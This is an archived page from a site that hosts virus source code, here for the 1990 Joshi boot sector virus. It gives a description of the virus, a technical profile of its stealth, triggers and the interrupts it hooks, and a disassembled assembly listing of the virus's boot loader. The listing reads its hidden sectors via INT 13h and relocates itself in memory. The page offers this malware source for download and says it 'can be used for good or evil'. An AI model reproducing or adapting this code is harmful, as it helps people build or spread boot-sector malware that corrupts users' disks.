<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: joshi_asm</title>
<meta name="KEYWORDS" content="joshi.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for joshi.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="j_1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_1808_asm.php">j_1808_asm</a><br>
<a href="j-1808_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-1808_asm.php">j-1808_asm</a><br>
<a href="j_a204_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_a204_asm.php">j_a204_asm</a><br>
<a href="j-a204_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-a204_asm.php">j-a204_asm</a><br>
<a href="jackal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jackal_asm.php">jackal_asm</a><br>
<a href="jap-xmas_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jap-xmas_asm.php">jap-xmas_asm</a><br>
<a href="jasmine_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jasmine_asm.php">jasmine_asm</a><br>
<a href="jaws26k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jaws26k_asm.php">jaws26k_asm</a><br>
<a href="jaws528_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jaws528_asm.php">jaws528_asm</a><br>
<a href="je_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/je_asm.php">je_asm</a><br>
<a href="jeru_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_asm.php">jeru_asm</a><br>
<a href="jerubc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerubc_asm.php">jerubc_asm</a><br>
<a href="jerube_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerube_asm.php">jerube_asm</a><br>
<a href="jeru_dc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_dc_asm.php">jeru_dc_asm</a><br>
<a href="jerufcen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerufcen_asm.php">jerufcen_asm</a><br>
<a href="jeru_fre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_fre_asm.php">jeru_fre_asm</a><br>
<a href="jeru_o_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeru_o_asm.php">jeru_o_asm</a><br>
<a href="jerusale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerusale_asm.php">jerusale_asm</a><br>
<a href="jerusalm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerusalm_asm.php">jerusalm_asm</a><br>
<a href="jerus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jerus_asm.php">jerus_asm</a><br>
<a href="jeruslm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruslm_asm.php">jeruslm_asm</a><br>
<a href="jeruzal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruzal_asm.php">jeruzal_asm</a><br>
<a href="jeruz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jeruz_asm.php">jeruz_asm</a><br>
<a href="jesus__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jesus__asm.php">jesus__asm</a><br>
<a href="jesus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jesus_asm.php">jesus_asm</a><br>
<a href="jfk3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jfk3_asm.php">jfk3_asm</a><br>
<a href="jo1_11_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jo1_11_asm.php">jo1_11_asm</a><br>
<a href="joana111_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joana111_asm.php">joana111_asm</a><br>
<a href="john_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/john_asm.php">john_asm</a><br>
<a href="johngalt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/johngalt_asm.php">johngalt_asm</a><br>
<a href="joker_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joker_3_asm.php">joker_3_asm</a><br>
<a href="joker_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joker_asm.php">joker_asm</a><br>
<a href="jokr1602_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jokr1602_asm.php">jokr1602_asm</a><br>
<a href="joshext_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshext_asm.php">joshext_asm</a><br>
<a href="joshi__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshi__asm.php">joshi__asm</a><br>
<a href="joshi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshi_asm.php">joshi_asm</a><br>
<a href="joshua_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/joshua_asm.php">joshua_asm</a><br>
<a href="jo_v111_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jo_v111_asm.php">jo_v111_asm</a><br>
<a href="j_sundyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j_sundyb_asm.php">j_sundyb_asm</a><br>
<a href="j-sundyb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/j-sundyb_asm.php">j-sundyb_asm</a><br>
<a href="jump4joy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jump4joy_asm.php">jump4joy_asm</a><br>
<a href="justice_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/justice_asm.php">justice_asm</a><br>
<a href="jw2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/jw2_asm.php">jw2_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="javascript:if(confirm('http://www.totallygeek.com/vscdb/r/index.php  \n\nThis file was not retrieved by Teleport Pro, because it was unavailable, or its retrieval was aborted, or the project was stopped too soon.  \n\nDo you want to open it from the server?'))window.location='http://www.totallygeek.com/vscdb/r/index.php'" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center>
<p><pre>
 Virus Name:  Joshi 
 Aliases:     Happy Birthday Joshi, Stealth Virus 
 V Status:    Common 
 Discovered:  June, 1990 
 Symptoms:    BSC, machine hangs and message 
 Origin:      India 
 Eff Length:  N/A 
 Type Code:   BRX - Resident Boot Sector/Partition Table Infector 
 Detection Method:  ViruScan V64+, Pro-Scan 1.4+ 
 Removal Instructions:  CleanUp V66+, Pro-Scan 1.4+, RmJoshi, 
              or Low-Level Format Harddisk and DOS SYS floppies 
 General Comments: 
       The Joshi Virus was isolated in India in June 1990.  At the time it was 
       isolated, it was reported to be widespread in India as well as 
       portions of the continent of Africa.  Joshi is a memory resident 
       boot sector infector of 5.25" diskettes.  It will also infect 
       hard disks, though in the case of hard disks it infects the partition 
       table or master boot sector rather than the boot sector (sector 0). 
 
       After a system has been booted from a Joshi-infected diskette, the 
       virus will be resident in memory.  Joshi takes up approximately 
       6K of system memory, and infected systems will show that total 
       system memory is 6K less than is installed if the DOS CHKDSK program 
       is run. 
 
       Joshi has some similarities to two other boot sector infectors. 
       Like the Stoned virus, it infects the partition table of hard disks. 
       Similar to the Brain virus's method of redirecting all attempts to 
       read the boot sector to the original boot sector, Joshi does this with 
       the partition table. 
 
       On January 5th of any year, the Joshi virus activates.  At that 
       time, the virus will hang the system while displaying the message: 
 
             "type Happy Birthday Joshi" 
 
       If the system user then types "Happy Birthday Joshi", the system 
       will again be usable. 
 
       This virus may be recognized on infected systems by powering off 
       the system and then booting from a known-clean write-protected 
       DOS diskette.  Using a sector editor or viewer to look at the 
       boot sector of suspect diskettes, if the first two bytes of the 
       boot sector are hex EB 1F, then the disk is infected.  The EB 1F 
       is a jump instruction to the rest of the viral  code. The remainder 
       of the virus is stored on track 41, sectors 1 thru 5 on 360K 
       5.25 inch Diskettes.  For 1.2M 5.25 inch diskettes, the viral code 
       is located at track 81, sectors 1 thru 5. 
 
       To determine if a system's hard disk is infected, you must look at 
       the hard disk's partition table.  If the first two bytes of the 
       partition table are EB 1F hex, then the hard disk is infected.  The 
       remainder of the virus can be found at track 0, sectors 2 thru 6. 
       The original partition table will be a track 0, sector 9. 
 
       The Joshi virus can be removed from an infected system by first 
       powering off the system, and then booting from a known-clean, write- 
       protected master DOS diskette.  If the system has a hard disk, the 
       hard disk should have data and program files backed up, and the 
       disk must be low-level formatted.  As of July 15, 1990, there are 
       no known utilities which can disinfect the partition table of the 
       hard disk when it is infected with Joshi.  Diskettes are easier to 
       remove Joshi from, the DOS SYS command can be used, or a program 
       such as MDisk from McAfee Associates, though this will leave the 
       viral code in an inexecutable state on track 41. 

------------------------8<-------------------------------------------------
NAME:              Joshi
ALIASES:
TARGETS:           MBR, FBR
RESIDENT:          Top
MEMORY_SIZE:       6K
STORAGE_SIZE:      8S
WHERE:             At 0.0.2-9 (Hard),
                   At 80.0.1-8 (1.2, 1.44),  {Yes, 80 -- "extra" track" }
                   At 40.0.1-8 (other floppies) {Yes, 40 -- "extra" track }
STEALTH:           13h/02h, 13h/03h, 13h/0Ah, 13h/0Bh, Ctrl-Alt-Del
POLYMORPHIC:       None
ARMOURING:         None
TUNNELLING:        None

INFECTIVITY:       6
OBVIOUSNESS:       Slightly
COMMONNESS:        3 (South Africa)
COMMONNESS_DATE:   1993-09-16
TRANSIENT_DAMAGE:  Screen display; user must type "Happy Birthday Joshi"
                   to regain control of machine
PERMANENT_DAMAGE:  None
T_DAMAGE_TRIGGER:  Month = January and DayOfMonth = 5
P_DAMAGE_TRIGGER:  n/a

SIDE_EFFECTS:      None
INFECTION_TRIGGER: Int13Read, Int13Write, Int13Verify
INFECTION_CRIT:    FloppyDrive = 0 or 1,
                   HardDrive = 128 or 129

MSG_DISPLAYED:     'Type "Happy Birthday Joshi" !'
MSG_NOT_DISPLAYED:

INTERRUPTS_HOOKED: 13h/02h, 13h/03h, 13h/04h, 13h/0Ah, 13h/0Bh,
                   21h/48h, 21h/49h, 21h/4Ah,
                   21h/2Ah, 21h/2Bh, 21h/2Ch, 21h/2Dh,
                   08h, 09h
SELFREC_IN_MEMORY: Broken {??? Apparently buggy attempt at Compares}
SELFREC_ON_DISK:   Compares
LIMITATIONS:       Display routine assumes colour video

COMMENTS:          Joshi is a bulky boot sector virus with read and write
                   stealth. Its hiding place on floppies is an extra track
                   which it formats for the purpose -- except that it
                   assumes that any disc with under 15 sectors per track
                   has only 40 tracks. This means that the "extra" track
                   on 720KB stiffies is actually track 40, so that any data
                   there is wiped out on infection.

                   Joshi stores the Interrupt Vector Table during bootup.
                   It then hooks INT 09h, and watches for Ctrl-Alt-Del.
                   If the 3-finger salute occurs, the virus copies the
                   boot-time IVT back in place and issues an INT 19h, thus
                   attempting to induce a "re-IPL" without a full reboot.
                   The virus is thus apparently able to survive a warm
                   boot -- though this trick crashes many PCs.

                   Joshi also traps INT 08h and uses it to monitor the state
                   of the INT 21h vector during bootup. Once it seems that
                   DOS is up and running, INT 21h is hooked. Thereafter,
                   whenever one of a number of DOS functions is called
                   (memory allocation and date/time services are trapped),
                   the virus checks to see if it is January 5th. If so,
                   the screen is set to 40x25 text mode; a full-screen
                   cyan box pops up and the message 'Type 'Happy Birthday
                   Joshi" !' appears. Once this command is obeyed
                   (exactly -- any mistakes in typing and you will have
                   to start over, without any keystroke echo to help you)
                   then control is regained. Ctrl-Alt-Del will not work
                   during the compulsory birthday greetings.

ANALYSIS_BY:       Paul Ducklin

  
</pre>
<p><textarea cols=90 rows=30>

PAGE  59,132
  
;==========================================================================
;==								         ==
;==			        JOSHI				         ==
;==								         ==
;==      Created:   20-May-91					         ==
;==      Version:						         ==
;==      Passes:    5	       Analysis Options on: ABFOPU	         ==
;==								         ==
;==								         ==
;==========================================================================
  
movseg		 macro reg16, unused, Imm16     ; Fixup for Assembler
		 ifidn	<reg16>, <bx>
		 db	0BBh
		 endif
		 ifidn	<reg16>, <cx>
		 db	0B9h
		 endif
		 ifidn	<reg16>, <dx>
		 db	0BAh
		 endif
		 ifidn	<reg16>, <si>
		 db	0BEh
		 endif
		 ifidn	<reg16>, <di>
		 db	0BFh
		 endif
		 ifidn	<reg16>, <bp>
		 db	0BDh
		 endif
		 ifidn	<reg16>, <sp>
		 db	0BCh
		 endif
		 ifidn	<reg16>, <BX>
		 db	0BBH
		 endif
		 ifidn	<reg16>, <CX>
		 db	0B9H
		 endif
		 ifidn	<reg16>, <DX>
		 db	0BAH
		 endif
		 ifidn	<reg16>, <SI>
		 db	0BEH
		 endif
		 ifidn	<reg16>, <DI>
		 db	0BFH
		 endif
		 ifidn	<reg16>, <BP>
		 db	0BDH
		 endif
		 ifidn	<reg16>, <SP>
		 db	0BCH
		 endif
		 dw	seg Imm16
endm
DATA_6E		EQU	7C1EH			; (97E4:7C1E=0)
DATA_7E		EQU	7C1FH			; (97E4:7C1F=0)
DATA_8E		EQU	7C20H			; (97E4:7C20=0)
  
SEG_A		SEGMENT	BYTE PUBLIC
		ASSUME	CS:SEG_A, DS:SEG_A
  
  
		ORG	100h
  
JOSHI		PROC	FAR
  
START:
		JMP	SHORT LOC_1		; (0121)
		NOP
		PUSH	AX
		INC	BX
		INC	DX
		DB	 61H, 63H, 6BH, 75H, 70H, 00H
		DB	 02H, 01H, 01H, 00H, 02H,0E0H
		DB	 00H, 60H, 09H,0F9H, 07H, 00H
		DB	 0FH, 00H, 02H, 00H, 00H, 00H
		DB	 50H, 01H, 00H
LOC_1:
		CLI				; Disable interrupts
		MOV	AX,CS
		MOV	DS,AX
		MOV	SS,AX
		MOV	SP,0F000H
		STI				; Enable interrupts
		MOV	AX,DATA_5		; (97E4:0413=0)
		MOV	CL,6
		SHL	AX,CL			; Shift w/zeros fill
		MOV	ES,AX
		MOV	AX,200H
		SUB	AX,21H
		MOV	DI,0
		MOV	SI,7C00H
		ADD	SI,AX
		ADD	DI,AX
		MOV	CX,179H
		SUB	CX,AX
		CLD				; Clear direction
		REPE	CMPSB			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		JNZ	LOC_2			; Jump if not zero
		MOV	AX,ES
		ADD	AX,20H
		MOV	ES,AX
		MOV	BX,0
		PUSH	ES
		PUSH	BX
		MOV	AX,1
		RETF				; Return far
LOC_2:
		MOV	AX,DATA_5		; (97E4:0413=0)
		SUB	AX,6
		MOV	DATA_5,AX		; (97E4:0413=0)
		MOV	CL,6
		SHL	AX,CL			; Shift w/zeros fill
		MOV	ES,AX
		MOV	SI,7C00H
		MOV	DI,0
		MOV	CX,200H
		CLD				; Clear direction
		REP	MOVSB			; Rep when cx >0 Mov [si] to es:[di]
		MOV	AX,ES
		ADD	AX,20H
		MOV	ES,AX
		MOV	BX,0
		PUSH	ES
		PUSH	BX
		PUSH	CS
		POP	DS
		MOV	AH,2
		MOV	AL,1
		MOV	CH,DS:DATA_6E		; (97E4:7C1E=0)
		MOV	CL,DS:DATA_7E		; (97E4:7C1F=0)
		MOV	DH,0
		MOV	DL,DS:DATA_8E		; (97E4:7C20=0)
		PUSH	AX
		MOV	AX,0B800H
		MOV	DS,AX
		POP	AX
LOC_3:
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	ES
		INT	13H			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
		POP	ES
		POP	DX
		POP	CX
		POP	BX
		POP	AX
		JNC	LOC_4			; Jump if carry=0
		PUSH	AX
		PUSH	BX
		PUSH	CX
		PUSH	DX
		PUSH	ES
		MOV	AH,0
		INT	13H			; Disk  dl=drive a  ah=func 00h
						;  reset disk, al=return status
		POP	ES
		POP	DX
		POP	CX
		POP	BX
		POP	AX
		JMP	SHORT LOC_3		; (01A1)
LOC_4:
		INC	CL
		ADD	BX,200H
		PUSH	DS
		PUSH	CS
		POP	DS
		PUSH	AX
		MOV	AL,CL
		SUB	AL,DS:DATA_7E		; (97E4:7C1F=0)
		SUB	AL,8
		POP	AX
		POP	DS
		JC	LOC_3			; Jump if carry Set
		MOV	AX,0
		RETF				; Return far
		DB	160 DUP (0)
		DB	 5AH, 5AH, 5AH, 5AH,0C8H, 14H
		DB	0A2H, 8CH, 01H, 00H, 0FH, 00H
		DB	 01H, 00H, 5CH, 00H
		DB	87 DUP (0)
		DB	 02H, 02H, 02H, 50H, 0FH, 0FH
		DB	 01H, 46H, 00H, 01H, 00H, 02H
		DB	 01H, 02H, 01H, 00H, 00H
		DB	46H
		DB	14 DUP (0)
		DB	0F9H,0FFH,0FFH, 00H
		DB	271 DUP (0)
DATA_5		DW	0
		DB	235 DUP (0)
  
JOSHI		ENDP
  
SEG_A		ENDS
  
  
  
		END	START

</textarea></td></tr></table></body></html>
